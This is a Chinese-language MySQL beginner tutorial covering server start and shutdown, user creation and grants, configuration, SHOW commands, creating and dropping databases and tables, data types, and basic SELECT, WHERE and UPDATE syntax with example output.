<p>Linux 系统下<br>首先，我们需要通过以下命令来检查MySQL服务器是否启动：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ps -ef | grep mysqld</span><br></pre></td></tr></table></figure></p>
<p>如果MySql已经启动，以上命令将输出mysql进程列表， 如果mysql未启动，你可以使用以下命令来启动mysql服务器:<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">root@host<span class="comment"># cd /usr/bin</span></span><br><span class="line">./mysqld_safe &amp;</span><br></pre></td></tr></table></figure></p>
<p>如果你想关闭目前运行的 MySQL 服务器, 你可以执行以下命令:<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">root@host<span class="comment"># cd /usr/bin</span></span><br><span class="line">./mysqladmin -u root -p shutdown</span><br><span class="line">Enter password: ******</span><br></pre></td></tr></table></figure></p>
<h2 id="MySQL-用户设置"><a href="#MySQL-用户设置" class="headerlink" title="MySQL 用户设置"></a>MySQL 用户设置</h2><p>如果你需要添加 MySQL 用户，你只需要在 mysql 数据库中的 user 表添加新用户即可。<br>以下为添加用户的的实例，用户名为guest，密码为guest123，并授权用户可进行 SELECT, INSERT 和 UPDATE操作权限：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">root@host<span class="comment"># mysql -u root -p</span></span><br><span class="line">Enter password:*******</span><br><span class="line">mysql&gt; use mysql;</span><br><span class="line">Database changed</span><br><span class="line"></span><br><span class="line">mysql&gt; INSERT INTO user </span><br><span class="line">          (host, user, password, </span><br><span class="line">           select_priv, insert_priv, update_priv) </span><br><span class="line">           VALUES (<span class="string">'localhost'</span>, <span class="string">'guest'</span>, </span><br><span class="line">           PASSWORD(<span class="string">'guest123'</span>), <span class="string">'Y'</span>, <span class="string">'Y'</span>, <span class="string">'Y'</span>);</span><br><span class="line">Query OK, 1 row affected (0.20 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; FLUSH PRIVILEGES;</span><br><span class="line">Query OK, 1 row affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT host, user, password FROM user WHERE user = <span class="string">'guest'</span>;</span><br><span class="line">+-----------+---------+------------------+</span><br><span class="line">| host      | user    | password         |</span><br><span class="line">+-----------+---------+------------------+</span><br><span class="line">| localhost | guest | 6f8c114b58f2ce9e |</span><br><span class="line">+-----------+---------+------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure></p>
<p>在添加用户时，请注意使用MySQL提供的 PASSWORD() 函数来对密码进行加密。 你可以在以上实例看到用户密码加密后为： 6f8c114b58f2ce9e.<br>注意：<br>1.在 MySQL5.7 中 user 表的 password 已换成了authentication_string。<br>2.password() 加密函数已经在 8.0.11 中移除了，可以使用 MD5() 函数代替。<br>3.在注意需要执行 FLUSH PRIVILEGES 语句。 这个命令执行后会重新载入授权表。<br>如果你不使用该命令，你就无法使用新创建的用户来连接mysql服务器，除非你重启mysql服务器。<br>你可以在创建用户时，为用户指定权限，在对应的权限列中，在插入语句中设置为 ‘Y’ 即可，用户权限列表如下：<br>Select_priv<br>Insert_priv<br>Update_priv<br>Delete_priv<br>Create_priv<br>Drop_priv<br>Reload_priv<br>Shutdown_priv<br>Process_priv<br>File_priv<br>Grant_priv<br>References_priv<br>Index_priv<br>Alter_priv</p>
<p>另外一种添加用户的方法为通过SQL的 GRANT 命令，以下命令会给指定数据库TUTORIALS添加用户 zara ，密码为 zara123 。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@host# mysql -u root -p</span><br><span class="line">Enter password:*******</span><br><span class="line">mysql&gt; use mysql;</span><br><span class="line">Database changed</span><br><span class="line"></span><br><span class="line">mysql&gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP</span><br><span class="line">    -&gt; ON TUTORIALS.*</span><br><span class="line">    -&gt; TO &apos;zara&apos;@&apos;localhost&apos;</span><br><span class="line">    -&gt; IDENTIFIED BY &apos;zara123&apos;;</span><br></pre></td></tr></table></figure></p>
<p>以上命令会在mysql数据库中的user表创建一条用户信息记录。</p>
<h2 id="etc-my-cnf-文件配置"><a href="#etc-my-cnf-文件配置" class="headerlink" title="/etc/my.cnf 文件配置"></a>/etc/my.cnf 文件配置</h2><p>一般情况下，你不需要修改该配置文件，该文件默认配置如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">datadir=/var/lib/mysql</span><br><span class="line">socket=/var/lib/mysql/mysql.sock</span><br><span class="line"></span><br><span class="line">[mysql.server]</span><br><span class="line">user=mysql</span><br><span class="line">basedir=/var/lib</span><br><span class="line"></span><br><span class="line">[safe_mysqld]</span><br><span class="line">err-log=/var/log/mysqld.log</span><br><span class="line">pid-file=/var/run/mysqld/mysqld.pid</span><br></pre></td></tr></table></figure></p>
<p>在配置文件中，你可以指定不同的错误日志文件存放的目录，一般你不需要改动这些配置。</p>
<h2 id="管理MySQL的命令"><a href="#管理MySQL的命令" class="headerlink" title="管理MySQL的命令"></a>管理MySQL的命令</h2><p>以下列出了使用Mysql数据库过程中常用的命令：</p>
<p>USE 数据库名 :<br>选择要操作的Mysql数据库，使用该命令后所有Mysql命令都只针对该数据库。<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">mysql&gt; use RUNOOB;</span><br><span class="line">Database changed</span><br></pre></td></tr></table></figure></p>
<p>SHOW DATABASES:<br>列出 MySQL 数据库管理系统的数据库列表。<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">mysql&gt; SHOW DATABASES;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| RUNOOB             |</span><br><span class="line">| cdcol              |</span><br><span class="line">| mysql              |</span><br><span class="line">| onethink           |</span><br><span class="line">| performance_schema |</span><br><span class="line">| phpmyadmin         |</span><br><span class="line">| <span class="built_in">test</span>               |</span><br><span class="line">| wecenter           |</span><br><span class="line">| wordpress          |</span><br><span class="line">+--------------------+</span><br><span class="line">10 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.02 sec)</span><br></pre></td></tr></table></figure></p>
<p>SHOW TABLES:<br>显示指定数据库的所有表，使用该命令前需要使用 use 命令来选择要操作的数据库。<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">mysql&gt; use RUNOOB;</span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; SHOW TABLES;</span><br><span class="line">+------------------+</span><br><span class="line">| Tables_in_runoob |</span><br><span class="line">+------------------+</span><br><span class="line">| employee_tbl     |</span><br><span class="line">| runoob_tbl       |</span><br><span class="line">| tcount_tbl       |</span><br><span class="line">+------------------+</span><br><span class="line">3 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure></p>
<p>SHOW COLUMNS FROM 数据表:<br>显示数据表的属性，属性类型，主键信息 ，是否为 NULL，默认值等其他信息。<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">mysql&gt; SHOW COLUMNS FROM runoob_tbl;</span><br><span class="line">+-----------------+--------------+------+-----+---------+-------+</span><br><span class="line">| Field           | Type         | Null | Key | Default | Extra |</span><br><span class="line">+-----------------+--------------+------+-----+---------+-------+</span><br><span class="line">| runoob_id       | int(11)      | NO   | PRI | NULL    |       |</span><br><span class="line">| runoob_title    | varchar(255) | YES  |     | NULL    |       |</span><br><span class="line">| runoob_author   | varchar(255) | YES  |     | NULL    |       |</span><br><span class="line">| submission_date | date         | YES  |     | NULL    |       |</span><br><span class="line">+-----------------+--------------+------+-----+---------+-------+</span><br><span class="line">4 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.01 sec)</span><br></pre></td></tr></table></figure></p>
<p>SHOW INDEX FROM 数据表:<br>显示数据表的详细索引信息，包括PRIMARY KEY（主键）。<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">mysql&gt; SHOW INDEX FROM runoob_tbl;</span><br><span class="line">+------------+------------+----------+--------------+-------------+-----------+-------------+----------+--------+------+------------+---------+---------------+</span><br><span class="line">| Table      | Non_unique | Key_name | Seq_in_index | Column_name | Collation | Cardinality | Sub_part | Packed | Null | Index_type | Comment | Index_comment |</span><br><span class="line">+------------+------------+----------+--------------+-------------+-----------+-------------+----------+--------+------+------------+---------+---------------+</span><br><span class="line">| runoob_tbl |          0 | PRIMARY  |            1 | runoob_id   | A         |           2 |     NULL | NULL   |      | BTREE      |         |               |</span><br><span class="line">+------------+------------+----------+--------------+-------------+-----------+-------------+----------+--------+------+------------+---------+---------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure></p>
<p>SHOW TABLE STATUS LIKE [FROM db_name] [LIKE ‘pattern’] \G:<br>该命令将输出Mysql数据库管理系统的性能及统计信息。<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">mysql&gt; SHOW TABLE STATUS  FROM RUNOOB;   <span class="comment"># 显示数据库 RUNOOB 中所有表的信息</span></span><br><span class="line"></span><br><span class="line">mysql&gt; SHOW TABLE STATUS from RUNOOB LIKE <span class="string">'runoob%'</span>;     <span class="comment"># 表名以runoob开头的表的信息</span></span><br><span class="line">mysql&gt; SHOW TABLE STATUS from RUNOOB LIKE <span class="string">'runoob%'</span>\G;   <span class="comment"># 加上 \G，查询结果按列打印</span></span><br></pre></td></tr></table></figure></p>
<h1 id="MySQL-连接"><a href="#MySQL-连接" class="headerlink" title="MySQL 连接"></a>MySQL 连接</h1><h2 id="使用mysql二进制方式连接"><a href="#使用mysql二进制方式连接" class="headerlink" title="使用mysql二进制方式连接"></a>使用mysql二进制方式连接</h2><p>您可以使用MySQL二进制方式进入到mysql命令提示符下来连接MySQL数据库。</p>
<p>实例</p>
<p>以下是从命令行中连接mysql服务器的简单实例：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@host]<span class="comment"># mysql -u root -p</span></span><br><span class="line">Enter password:******</span><br></pre></td></tr></table></figure></p>
<p>在登录成功后会出现 mysql&gt; 命令提示窗口，你可以在上面执行任何 SQL 语句。</p>
<p>以上命令执行后，登录成功输出结果如下:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 2854760 to server version: 5.0.9</span><br><span class="line"></span><br><span class="line">Type <span class="string">'help;'</span> or <span class="string">'\h'</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">'\c'</span> to clear the buffer.</span><br></pre></td></tr></table></figure>
<p>在以上实例中，我们使用了root用户登录到mysql服务器，当然你也可以使用其他mysql用户登录。</p>
<p>如果用户权限足够，任何用户都可以在mysql的命令提示窗口中进行SQL操作。</p>
<p>退出 mysql&gt; 命令提示窗口可以使用 exit 命令，如下所示：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">mysql&gt; <span class="built_in">exit</span></span><br><span class="line">Bye</span><br></pre></td></tr></table></figure></p>
<h2 id="MySQL-创建数据库"><a href="#MySQL-创建数据库" class="headerlink" title="MySQL 创建数据库"></a>MySQL 创建数据库</h2><p>我们可以在登陆 MySQL 服务后，使用 create 命令创建数据库，语法如下:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE DATABASE 数据库名;</span><br></pre></td></tr></table></figure></p>
<p>以下命令简单的演示了创建数据库的过程，数据名为 RUNOOB:<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@host]<span class="comment"># mysql -u root -p   </span></span><br><span class="line">Enter password:******  <span class="comment"># 登录后进入终端</span></span><br><span class="line"></span><br><span class="line">mysql&gt; create DATABASE RUNOOB;</span><br></pre></td></tr></table></figure></p>
<p>使用 mysqladmin 创建数据库</p>
<p>使用普通用户，你可能需要特定的权限来创建或者删除 MySQL 数据库。</p>
<p>所以我们这边使用root用户登录，root用户拥有最高权限，可以使用 mysql mysqladmin 命令来创建数据库。</p>
<p>以下命令简单的演示了创建数据库的过程，数据名为 RUNOOB:<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@host]<span class="comment"># mysqladmin -u root -p create RUNOOB</span></span><br><span class="line">Enter password:******</span><br></pre></td></tr></table></figure></p>
<p>以上命令执行成功后会创建 MySQL 数据库 RUNOOB。</p>
<h1 id="MySQL-删除数据库"><a href="#MySQL-删除数据库" class="headerlink" title="MySQL 删除数据库"></a>MySQL 删除数据库</h1><p>使用普通用户登陆 MySQL 服务器，你可能需要特定的权限来创建或者删除 MySQL 数据库，所以我们这边使用 root 用户登录，root 用户拥有最高权限。</p>
<p>在删除数据库过程中，务必要十分谨慎，因为在执行删除命令后，所有数据将会消失。</p>
<h2 id="drop-命令删除数据库"><a href="#drop-命令删除数据库" class="headerlink" title="drop 命令删除数据库"></a>drop 命令删除数据库</h2><p>drop 命令格式：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">drop database &lt;数据库名&gt;;</span><br></pre></td></tr></table></figure></p>
<p>例如删除名为 RUNOOB 的数据库：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; drop database RUNOOB;</span><br></pre></td></tr></table></figure></p>
<h2 id="使用-mysqladmin-删除数据库"><a href="#使用-mysqladmin-删除数据库" class="headerlink" title="使用 mysqladmin 删除数据库"></a>使用 mysqladmin 删除数据库</h2><p>你也可以使用 mysql mysqladmin 命令在终端来执行删除命令。</p>
<p>以下实例删除数据库 RUNOOB(该数据库在前一章节已创建)：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@host]# mysqladmin -u root -p drop RUNOOB</span><br><span class="line">Enter password:******</span><br></pre></td></tr></table></figure></p>
<p>执行以上删除数据库命令后，会出现一个提示框，来确认是否真的删除数据库：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Dropping the database is potentially a very bad thing to do.</span><br><span class="line">Any data stored in the database will be destroyed.</span><br><span class="line"></span><br><span class="line">Do you really want to drop the &apos;RUNOOB&apos; database [y/N] y</span><br><span class="line">Database &quot;RUNOOB&quot; dropped</span><br></pre></td></tr></table></figure></p>
<h1 id="MySQL-选择数据库"><a href="#MySQL-选择数据库" class="headerlink" title="MySQL 选择数据库"></a>MySQL 选择数据库</h1><p>在你连接到 MySQL 数据库后，可能有多个可以操作的数据库，所以你需要选择你要操作的数据库。</p>
<h2 id="从命令提示窗口中选择MySQL数据库"><a href="#从命令提示窗口中选择MySQL数据库" class="headerlink" title="从命令提示窗口中选择MySQL数据库"></a>从命令提示窗口中选择MySQL数据库</h2><p>在 mysql&gt; 提示窗口中可以很简单的选择特定的数据库。你可以使用SQL命令来选择指定的数据库。</p>
<p>实例</p>
<p>以下实例选取了数据库 RUNOOB:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@host]# mysql -u root -p</span><br><span class="line">Enter password:******</span><br><span class="line">mysql&gt; use RUNOOB;</span><br><span class="line">Database changed</span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure></p>
<p>执行以上命令后，你就已经成功选择了 RUNOOB 数据库，在后续的操作中都会在 RUNOOB 数据库中执行。<br>注意:所有的数据库名，表名，表字段都是区分大小写的。所以你在使用SQL命令时需要输入正确的名称。</p>
<h1 id="MySQL-数据类型"><a href="#MySQL-数据类型" class="headerlink" title="MySQL 数据类型"></a>MySQL 数据类型</h1><p>MySQL中定义数据字段的类型对你数据库的优化是非常重要的。<br>MySQL支持多种类型，大致可以分为三类：数值、日期/时间和字符串(字符)类型。</p>
<h2 id="数值类型"><a href="#数值类型" class="headerlink" title="数值类型"></a>数值类型</h2><p>MySQL支持所有标准SQL数值数据类型。</p>
<p>这些类型包括严格数值数据类型(INTEGER、SMALLINT、DECIMAL和NUMERIC)，以及近似数值数据类型(FLOAT、REAL和DOUBLE PRECISION)。</p>
<p>关键字INT是INTEGER的同义词，关键字DEC是DECIMAL的同义词。</p>
<p>BIT数据类型保存位字段值，并且支持MyISAM、MEMORY、InnoDB和BDB表。</p>
<p>作为SQL标准的扩展，MySQL也支持整数类型TINYINT、MEDIUMINT和BIGINT。下面的表显示了需要的每个整数类型的存储和范围。</p>
<p>类型    大小    范围（有符号）    范围（无符号）    用途<br>TINYINT    1 字节    (-128，127)    (0，255)    小整数值<br>SMALLINT    2 字节    (-32 768，32 767)    (0，65 535)    大整数值<br>MEDIUMINT    3 字节    (-8 388 608，8 388 607)    (0，16 777 215)    大整数值<br>INT或INTEGER    4 字节    (-2 147 483 648，2 147 483 647)    (0，4 294 967 295)    大整数值<br>BIGINT    8 字节    (-9,223,372,036,854,775,808，9 223 372 036 854 775 807)    (0，18 446 744 073 709 551 615)    极大整数值<br>FLOAT    4 字节    (-3.402 823 466 E+38，-1.175 494 351 E-38)，0，(1.175 494 351 E-38，3.402 823 466 351 E+38)    0，(1.175 494 351 E-38，3.402 823 466 E+38)    单精度<br>浮点数值<br>DOUBLE    8 字节    (-1.797 693 134 862 315 7 E+308，-2.225 073 858 507 201 4 E-308)，0，(2.225 073 858 507 201 4 E-308，1.797 693 134 862 315 7 E+308)    0，(2.225 073 858 507 201 4 E-308，1.797 693 134 862 315 7 E+308)    双精度<br>浮点数值<br>DECIMAL    对DECIMAL(M,D) ，如果M&gt;D，为M+2否则为D+2    依赖于M和D的值    依赖于M和D的值    小数值</p>
<h2 id="日期和时间类型"><a href="#日期和时间类型" class="headerlink" title="日期和时间类型"></a>日期和时间类型</h2><p>表示时间值的日期和时间类型为DATETIME、DATE、TIMESTAMP、TIME和YEAR。</p>
<p>每个时间类型有一个有效值范围和一个”零”值，当指定不合法的MySQL不能表示的值时使用”零”值。</p>
<p>TIMESTAMP类型有专有的自动更新特性，将在后面描述。</p>
<p>类型    大小<br>(字节)    范围    格式    用途<br>DATE    3    1000-01-01/9999-12-31    YYYY-MM-DD    日期值<br>TIME    3    ‘-838:59:59’/‘838:59:59’    HH:MM:SS    时间值或持续时间<br>YEAR    1    1901/2155    YYYY    年份值<br>DATETIME    8    1000-01-01 00:00:00/9999-12-31 23:59:59    YYYY-MM-DD HH:MM:SS    混合日期和时间值<br>TIMESTAMP    4<br>1970-01-01 00:00:00/2038</p>
<p>结束时间是第 2147483647 秒，北京时间 2038-1-19 11:14:07，格林尼治时间 2038年1月19日 凌晨 03:14:07</p>
<p>YYYYMMDD HHMMSS    混合日期和时间值，时间戳</p>
<h2 id="字符串类型"><a href="#字符串类型" class="headerlink" title="字符串类型"></a>字符串类型</h2><p>字符串类型指CHAR、VARCHAR、BINARY、VARBINARY、BLOB、TEXT、ENUM和SET。该节描述了这些类型如何工作以及如何在查询中使用这些类型。</p>
<p>类型    大小    用途<br>CHAR    0-255字节    定长字符串<br>VARCHAR    0-65535 字节    变长字符串<br>TINYBLOB    0-255字节    不超过 255 个字符的二进制字符串<br>TINYTEXT    0-255字节    短文本字符串<br>BLOB    0-65 535字节    二进制形式的长文本数据<br>TEXT    0-65 535字节    长文本数据<br>MEDIUMBLOB    0-16 777 215字节    二进制形式的中等长度文本数据<br>MEDIUMTEXT    0-16 777 215字节    中等长度文本数据<br>LONGBLOB    0-4 294 967 295字节    二进制形式的极大文本数据<br>LONGTEXT    0-4 294 967 295字节    极大文本数据</p>
<p>CHAR 和 VARCHAR 类型类似，但它们保存和检索的方式不同。它们的最大长度和是否尾部空格被保留等方面也不同。在存储或检索过程中不进行大小写转换。</p>
<p>BINARY 和 VARBINARY 类似于 CHAR 和 VARCHAR，不同的是它们包含二进制字符串而不要非二进制字符串。也就是说，它们包含字节字符串而不是字符字符串。这说明它们没有字符集，并且排序和比较基于列值字节的数值值。</p>
<p>BLOB 是一个二进制大对象，可以容纳可变数量的数据。有 4 种 BLOB 类型：TINYBLOB、BLOB、MEDIUMBLOB 和 LONGBLOB。它们区别在于可容纳存储范围不同。</p>
<p>有 4 种 TEXT 类型：TINYTEXT、TEXT、MEDIUMTEXT 和 LONGTEXT。对应的这 4 种 BLOB 类型，可存储的最大长度不同，可根据实际情况选择。</p>
<h1 id="MySQL-创建数据表"><a href="#MySQL-创建数据表" class="headerlink" title="MySQL 创建数据表"></a>MySQL 创建数据表</h1><p>创建MySQL数据表需要以下信息:</p>
<ol>
<li>表名</li>
<li>表字段名</li>
<li>定义每个表字段</li>
</ol>
<h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><p>以下为创建MySQL数据表的SQL通用语法：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> table_name (column_name column_type);</span><br></pre></td></tr></table></figure></p>
<p>以下例子中我们将在 RUNOOB 数据库中创建数据表runoob_tbl：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> <span class="string">`runoob_tbl`</span>(</span><br><span class="line">   <span class="string">`runoob_id`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> AUTO_INCREMENT,</span><br><span class="line">   <span class="string">`runoob_title`</span> <span class="built_in">VARCHAR</span>(<span class="number">100</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">   <span class="string">`runoob_author`</span> <span class="built_in">VARCHAR</span>(<span class="number">40</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">   <span class="string">`submission_date`</span> <span class="built_in">DATE</span>,</span><br><span class="line">   PRIMARY <span class="keyword">KEY</span> ( <span class="string">`runoob_id`</span> )</span><br><span class="line">)<span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8;</span><br></pre></td></tr></table></figure></p>
<p>实例解析：<br>1.如果你不想字段为 NULL 可以设置字段的属性为 NOT NULL， 在操作数据库时如果输入该字段的数据为NULL ，就会报错。<br>2.AUTO_INCREMENT定义列为自增的属性，一般用于主键，数值会自动加1。<br>3.PRIMARY KEY关键字用于定义列为主键。 您可以使用多列来定义主键，列间以逗号分隔。<br>4.ENGINE 设置存储引擎，CHARSET 设置编码。</p>
<h1 id="MySQL-删除数据表"><a href="#MySQL-删除数据表" class="headerlink" title="MySQL 删除数据表"></a>MySQL 删除数据表</h1><p>MySQL中删除数据表是非常容易操作的， 但是你再进行删除表操作时要非常小心，因为执行删除命令后所有数据都会消失。</p>
<h2 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h2><p>以下为删除MySQL数据表的通用语法：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> table_name ;</span><br></pre></td></tr></table></figure></p>
<h1 id="MySQL-插入数据"><a href="#MySQL-插入数据" class="headerlink" title="MySQL 插入数据"></a>MySQL 插入数据</h1><p>MySQL 表中使用 INSERT INTO SQL语句来插入数据。</p>
<h2 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h2><p>以下为向MySQL数据表插入数据通用的 INSERT INTO SQL语法：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> table_name ( field1, field2,...fieldN )</span><br><span class="line">                       <span class="keyword">VALUES</span></span><br><span class="line">                       ( value1, value2,...valueN );</span><br></pre></td></tr></table></figure></p>
<p>如果数据是字符型，必须使用单引号或者双引号，如：”value”。</p>
<h1 id="MySQL-查询数据"><a href="#MySQL-查询数据" class="headerlink" title="MySQL 查询数据"></a>MySQL 查询数据</h1><p>MySQL 数据库使用SQL SELECT语句来查询数据。</p>
<h2 id="语法-3"><a href="#语法-3" class="headerlink" title="语法"></a>语法</h2><p>以下为在MySQL数据库中查询数据通用的 SELECT 语法：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name,column_name</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line">[<span class="keyword">WHERE</span> Clause]</span><br><span class="line">[<span class="keyword">LIMIT</span> N][ <span class="keyword">OFFSET</span> M]</span><br></pre></td></tr></table></figure></p>
<ol>
<li>查询语句中你可以使用一个或者多个表，表之间使用逗号(,)分割，并使用WHERE语句来设定查询条件。</li>
<li>SELECT 命令可以读取一条或者多条记录。</li>
<li>你可以使用星号（*）来代替其他字段，SELECT语句会返回表的所有字段数据</li>
<li>你可以使用 WHERE 语句来包含任何条件。</li>
<li>你可以使用 LIMIT 属性来设定返回的记录数。</li>
<li>你可以通过OFFSET指定SELECT语句开始查询的数据偏移量。默认情况下偏移量为0。</li>
</ol>
<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>以下实例将返回数据表 runoob_tbl 的所有记录:<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> runoob_tbl;</span><br></pre></td></tr></table></figure></p>
<h1 id="MySQL-WHERE-子句"><a href="#MySQL-WHERE-子句" class="headerlink" title="MySQL WHERE 子句"></a>MySQL WHERE 子句</h1><p>我们知道从 MySQL 表中使用 SQL SELECT 语句来读取数据。</p>
<p>如需有条件地从表中选取数据，可将 WHERE 子句添加到 SELECT 语句中。</p>
<h2 id="语法-4"><a href="#语法-4" class="headerlink" title="语法"></a>语法</h2><p>以下是 SQL SELECT 语句使用 WHERE 子句从数据表中读取数据的通用语法：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> field1, field2,...fieldN <span class="keyword">FROM</span> table_name1, table_name2...</span><br><span class="line">[<span class="keyword">WHERE</span> condition1 [<span class="keyword">AND</span> [<span class="keyword">OR</span>]] condition2.....</span><br></pre></td></tr></table></figure></p>
<ol>
<li>查询语句中你可以使用一个或者多个表，表之间使用逗号, 分割，并使用WHERE语句来设定查询条件。</li>
<li>你可以在 WHERE 子句中指定任何条件。</li>
<li>你可以使用 AND 或者 OR 指定一个或多个条件。</li>
<li>WHERE 子句也可以运用于 SQL 的 DELETE 或者 UPDATE 命令。</li>
<li>WHERE 子句类似于程序语言中的 if 条件，根据 MySQL 表中的字段值来读取指定的数据。</li>
</ol>
<p>以下为操作符列表，可用于 WHERE 子句中。</p>
<p>下表中实例假定 A 为 10, B 为 20<br>操作符    描述    实例<br>=    等号，检测两个值是否相等，如果相等返回true    (A = B) 返回false。<br>&lt;&gt;, !=    不等于，检测两个值是否相等，如果不相等返回true    (A != B) 返回 true。</p>
<blockquote>
<p>   大于号，检测左边的值是否大于右边的值, 如果左边的值大于右边的值返回true    (A &gt; B) 返回false。<br>&lt;    小于号，检测左边的值是否小于右边的值, 如果左边的值小于右边的值返回true    (A &lt; B) 返回 true。<br>=    大于等于号，检测左边的值是否大于或等于右边的值, 如果左边的值大于或等于右边的值返回true    (A &gt;= B) 返回false。<br>&lt;=    小于等于号，检测左边的值是否小于于或等于右边的值, 如果左边的值小于或等于右边的值返回true    (A &lt;= B) 返回 true。</p>
</blockquote>
<p>如果我们想在 MySQL 数据表中读取指定的数据，WHERE 子句是非常有用的。</p>
<p>使用主键来作为 WHERE 子句的条件查询是非常快速的。</p>
<p>如果给定的条件在表中没有任何匹配的记录，那么查询不会返回任何数据。</p>
<p>以下实例将读取 runoob_tbl 表中 runoob_author 字段值为 Sanjay 的所有记录：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">from</span> runoob_tbl <span class="keyword">WHERE</span> runoob_author=<span class="string">'菜鸟教程'</span>;</span><br></pre></td></tr></table></figure></p>
<p>MySQL 的 WHERE 子句的字符串比较是不区分大小写的。 你可以使用 BINARY 关键字来设定 WHERE 子句的字符串比较是区分大小写的。<br>如下实例:<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT * from runoob_tbl WHERE BINARY runoob_author='runoob.com';</span><br><span class="line">Empty <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; <span class="keyword">SELECT</span> * <span class="keyword">from</span> runoob_tbl <span class="keyword">WHERE</span> <span class="built_in">BINARY</span> runoob_author=<span class="string">'RUNOOB.COM'</span>;</span><br><span class="line">+<span class="comment">-----------+---------------+---------------+-----------------+</span></span><br><span class="line">| runoob_id | runoob_title  | runoob_author | submission_date |</span><br><span class="line">+<span class="comment">-----------+---------------+---------------+-----------------+</span></span><br><span class="line">| 3         | JAVA 教程   | RUNOOB.COM    | 2016-05-06      |</span><br><span class="line">| 4         | 学习 Python | RUNOOB.COM    | 2016-03-06      |</span><br><span class="line">+<span class="comment">-----------+---------------+---------------+-----------------+</span></span><br><span class="line">2 rows in <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br></pre></td></tr></table></figure></p>
<h1 id="MySQL-UPDATE-更新"><a href="#MySQL-UPDATE-更新" class="headerlink" title="MySQL UPDATE 更新"></a>MySQL UPDATE 更新</h1><p>如果我们需要修改或更新 MySQL 中的数据，我们可以使用 SQL UPDATE 命令来操作。</p>
<h2 id="语法-5"><a href="#语法-5" class="headerlink" title="语法"></a>语法</h2><p>以下是 UPDATE 命令修改 MySQL 数据表数据的通用 SQL 语法：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> table_name <span class="keyword">SET</span> field1=<span class="keyword">new</span>-value1, field2=<span class="keyword">new</span>-value2</span><br><span class="line">[<span class="keyword">WHERE</span> Clause]</span><br></pre></td></tr></table></figure></p>
<ol>
<li>你可以同时更新一个或多个字段。</li>
<li>你可以在 WHERE 子句中指定任何条件。</li>
<li>你可以在一个单独表中同时更新数据。</li>
</ol>
<p>当你需要更新数据表中指定行的数据时 WHERE 子句是非常有用的。</p>
